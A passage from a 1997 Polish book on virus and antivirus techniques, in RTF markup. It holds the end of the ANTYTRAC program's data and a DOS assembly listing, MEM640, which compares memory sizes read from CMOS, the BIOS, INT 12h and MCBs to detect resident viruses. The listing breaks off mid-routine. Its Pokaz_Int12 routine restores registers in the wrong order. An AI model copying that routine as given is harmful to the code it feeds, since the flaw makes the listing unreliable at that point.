\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PrintChar endp}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      TeCopyRight db CR,LF,'ANTYTRAC v1.0, Autor : Adam Blaszczyk 1997'}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      TeCRLF      db CR,LF,NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeZainstalowany db CR,LF,' _ ANTYTRAC zainstalowany!',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch  TeOdinstalowany db CR,LF,' _ ANTYTRAC odinstalowany!',NUL}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ANTYTRAC ENDS                           ; koniec segmentu kodu i danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch END Start                               ; koniec programu, pierwsza instrukcja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; pod etykieta Start}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 12.8. Pobieranie wielko\uc1\u347\'9cci pami\uc1\u281\'eaci operacyjnej}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ze wzgl\uc1\u281\'eadu na to, i\uc1\u380\'bf wi\uc1\u281\'eakszo\uc1\u347\'9c\uc1\u263\'e6 wirus\'f3w rezydentnych instaluje si\uc1\u281\'ea w pami\uc1\u281\'eaci poprzez modyfikacj\uc1\u281\'ea nag\uc1\u322\'b3\'f3wk\'f3w pami\uc1\u281\'eaci MCB, mo\uc1\u380\'bfliwe jest wykrycie wi\uc1\u281\'eakszo\uc1\u347\'9cci takich intruz\'f3w poprzez obliczenie wielko\uc1\u347\'9cci dost\uc1\u281\'eapnej pami\uc1\u281\'eaci na r\'f3\uc1\u380\'bfne sposoby i nast\uc1\u281\'eapnie na por\'f3wnaniu, czy uzyskane warto\uc1\u347\'9cci zgadzaj\uc1\u261\'b9 si\uc1\u281\'ea ze sob\uc1\u261\'b9. Poni\uc1\u380\'bfszy program pobiera na cztery sposoby wielko\uc1\u347\'9c\uc1\u263\'e6 pami\uc1\u281\'eaci operacyjnej poni\uc1\u380\'bfej 640K i nast\uc1\u281\'eapnie rozmiar ten wy\uc1\u347\'9cwietla na ekranie.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;       Czesc ksiazki : "Nowoczesne techniki wirusowe i antywirusowe"        ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                       MEM640 v1.0, Autor : Adam Blaszczyk 1997             ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Programik pobiera i wyswietla rozmiar pamieci ponizej 640kb   ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Wielkosc pamieci jest pobierana kilkoma metodami              ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              Przy jego uzyciu mozna wykryc w pamieci obecnosc wirusa       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;              rezydetnego (gdy odczytane dlugosci pamieci beda rozne)       ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;                                                                            ;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;----------------------------------------------------------------------------;}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PROG SEGMENT}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      ORG  100h}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      ASSUME CS:PROG, DS:PROG}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      NUL = 00h                           ; \\}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      LF  = 0Ah                           ;  - stale znakow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch      CR  = 0Dh                           ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Start:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeCopyRight              ; SI=ofset do info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukLn                      ; wyswietl info o programie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Pokaz_CMOS                  ; ile zapisane w CMOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        call  Pokaz_ZmiennaBIOS           ; ile w komorce 0000:0413}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        call  Pokaz_Int12                 ; ile zwraca INT 12}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Pokaz_MCB                   ; ile z sumy MCB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,4C00h                    ; funkcja DOS - koncz program}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pokaz_CMOS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax dx si                    ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeCMOS                   ; \\ wyswietl info skad czytany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ; / rozmiar pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   al,16h                      ; \\ wez z CMOS starsza czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  WezCMOS                     ; / rozmiaru pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ah,al                       ; i przepisz do AH}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   al,15h                      ; \\ wez z CMOS starsza czesc}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  WezCMOS                     ; / rozmiaru pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; AX= rozmiar w CMOS w kilobajtach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   dx,1024                     ; \\ oblicz ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mul   dx                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukDec32                   ; wyswietl ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   si dx ax                    ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch WezCMOS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        out   70h,al                      ; zapisz do portu CMOS,}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; ktora komorke czytac}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jmp   $+2                         ; czekaj}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        in    al,71h                      ; czytaj z CMOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pokaz_Int12:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax dx si                    ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeInt12                  ; \\ wyswietl info skad czytany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ; / rozmiar pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   12h                         ; przerwanie BIOS - dostepna pamiec}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ; AX=rozmiar pamieci w kilobajtach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   dx,1024                     ; \\ oblicz ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mul   dx                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        call  DrukDec32                   ; wyswietl ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   dx ax si                    ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pokaz_ZmiennaBIOS:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  es ax dx si                 ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeZmiennaBIOS            ; \\ wyswietl info skad czytany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ; / rozmiar pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xor   ax,ax                       ; czytaj zmienna BIOS 0000:0413}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   es,ax                       ; ES=0000}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,es:[413h]                ; AX=0000:0413= rozmiar pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                          ;  w kilobajtach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   dx,1024                     ; \\ oblicz ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mul   dx                          ; /}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  DrukDec32                   ; wyswietl ile bajtow}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        pop   si dx ax es                 ; przywroc zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        ret                               ; powrot}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ;-----------------------------------------------------------------------------}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Pokaz_MCB:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  es ax bx cx dx              ; zachowaj zmieniane rejestry}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        lea   si,TeMCB                    ; \\ wyswietl info skad czytany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        Call  Druk                        ; / rozmiar pamieci}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5802h                    ; funkcja DOS - czy UMB dolaczone ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        push  ax                          ; zachowaj informacje na pozniej}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5803h                    ; funkcja DOS - dolacz/odlacz bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   bx,1                        ; sprobuj dolaczyc bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5802h                    ; funkcja DOS - czy UMB dolaczone ?}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        int   21h                         ; wywolaj funkcje}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xor   cx,cx                       ; CX=0 - UMB nieobecne w systemie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        or    al,al                       ; 01=jezeli UMB sa dolaczone}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        jz    UMB_NieDolaczone            ; 00=jezeli UMB nie sa dolaczone}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        inc   cx                          ; CX=1 - UMB obecne w systemie}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        mov   ax,5803h                    ; funkcja DOS - dolacz/odlacz bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch        xor   bx,bx                       ; odlacz bloki UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
